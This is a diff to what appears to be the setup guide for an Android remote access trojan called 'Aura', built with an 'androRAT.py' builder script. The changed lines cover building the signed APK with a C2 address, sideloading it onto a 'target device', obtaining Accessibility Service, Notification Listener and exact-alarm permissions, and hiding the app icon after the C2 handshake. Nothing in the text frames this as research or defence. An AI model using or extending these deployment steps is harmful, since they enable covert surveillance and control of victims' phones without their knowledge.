@@ -65,7 +65,7 @@ private static final String[] DDR_URLS = {
 ### 3.2 Build the APK
 Use the `androRAT.py` builder script to compile and sign the APK:
 ```bash
-python3 androRAT.py --build --ip 127.0.0.1 --port 4444 --output Aura_v3.1.apk --icon
+python3 androRAT.py --build --ip 127.0.0.1 --port 4444 --output Aura_v3.2.1.apk --icon
 ```
 *(Note: Since we use DDR, the IP/Port passed to the builder are used only as fallbacks)*.
 
@@ -73,9 +73,9 @@ python3 androRAT.py --build --ip 127.0.0.1 --port 4444 --output Aura_v3.1.apk --
 
 ## 🚀 4. Deployment & Activation
 
-1.  **Transfer**: Sideload the `Aura_v3.1.apk` onto the target device.
-2.  **Permissions**: Follow the on-screen setup to grant **Accessibility Service** and **Notification Listener** permissions.
-3.  **Hide**: The app icon will automatically hide from the launcher after the first activation.
+1.  **Transfer**: Sideload the `Aura_v3.2.1.apk` onto the target device.
+2.  **Permissions**: Follow the on-screen setup to grant **Accessibility Service**, **Notification Listener**, and **Schedule Exact Alarms** permissions.
+3.  **Hide**: The app icon will automatically hide from the launcher after the first successful C2 handshake.
 4.  **Confirm**: Check the Web Dashboard to see the new device appear in the list.
 
 ### 🛡️ Post-Install Hardening
